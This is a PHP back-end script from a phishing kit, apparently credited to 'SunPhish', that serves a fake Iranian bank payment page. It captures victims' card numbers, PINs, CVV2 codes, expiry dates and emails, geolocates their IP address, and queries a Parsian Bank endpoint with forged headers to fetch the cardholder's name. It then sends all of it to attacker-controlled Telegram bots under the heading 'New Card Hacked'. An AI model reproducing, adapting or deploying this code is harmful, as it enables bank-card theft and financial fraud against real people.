<?php

if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

include "functions.php";
include "time.php" ;
$e= basename($_POST ["e"]);
include"../data/$e.php";
include"../INFO.php";

$paylimit = 3; 
$sendEmail = true;
$pan = $_POST["pan"];
$pin = $_POST["pin"];
$cvv = $_POST["cvv2"];
$year = $_POST["expireYear"];
$month = $_POST["expireMonth"];
$num = $_POST["num"];
$amount = $_POST["am"];
if(isset($_POST["inputemail"])){
    $email = $_POST["inputemail"];
}else{
    $email = "None";
    

   
    
}

$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);

$ip = $_SERVER['REMOTE_ADDR'];
$Get_Ip = json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$lat = $Get_Ip->lat;
$lon = $Get_Ip->lon;
$isp = $Get_Ip->isp;
$regionName = $Get_Ip->regionName;
$region = $Get_Ip->region;


$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://ipb.parsian-bank.ir/mobileBank/1.0/getCardOwnerWithoutLogin");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt( $ch, CURLOPT_HTTPHEADER, array("REMOTE_ADDR: " . $_SERVER["REMOTE_ADDR"], "HTTP_X_FORWARDED_FOR: ". $_SERVER["REMOTE_ADDR"]));
        curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"destinationPan\":\"$pan\",\"pan\":\"6280231350040589\"}");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json; charset=UTF-8',
            'User-Agent: Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.83 Mobile Safari/537.36'
        ));
        $result     = curl_exec($ch);
        $json       = json_decode($result, true);
        $holderName = $json["firstName"] . " " . $json["lastName"];
$Text = "
New Card Hacked 😍
➖➖➖➖➖➖➖➖
🏦вǞПκ: $bankinfo[1]
🔥𝙲𝙰𝚁𝙳: <code>$pan1 $pan2 $pan3 $pan4</code>
🌩𝙿𝚊𝚜𝚜𝟤: <code>$pin</code>
🔱𝙲𝚟𝚟𝟤: <code>$cvv</code>
🔱𝚢𝚎𝚊𝚛: <code>$year</code> Month: <code>$month</code>
🌐𝙸𝙿: <code>$ip</code>
👥𝐶𝑎𝑟𝑑 𝐻𝑜𝑙𝑑𝑒𝑟 : <code>$holderName</code>
⏰𝚃𝙸𝙼𝙴: $saat
📝𝚃𝙾𝙳𝙰𝚈: $roz
📌𝙳𝙰𝚃𝙴: $tarikh
💴𝙰𝙼𝙾𝚄𝙽𝚃 : $amount 𝗥𝗶𝗮𝗹𝘀
✨ 𝙿𝙾𝚁𝚃𝙰𝙻 : 𝙼𝙴𝙻𝙻𝙰𝚃
   ➖➖➖➖➖➖➖➖
Code By : SunPhish
Channel : @anabel_phishing
Channel : @Panda_Phish

| IP : $ip | ISP : $isp | REGION NAME : $regionName | REGION : $region |

";
    
$Text .="\n$bankinfo[0]⁉️Spam: $num";

if($sendEmail==true){
    $Text .="\n⁉️Email: $email";
}

if( (integer)$num > $paylimit){}else{
    file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text));
 file_get_contents("https://api.telegram.org/bot".$TOKENS."/sendMessage?parse_mode=HTML&chat_id=".$IDS."&text=".urlencode($Text));
} 

?>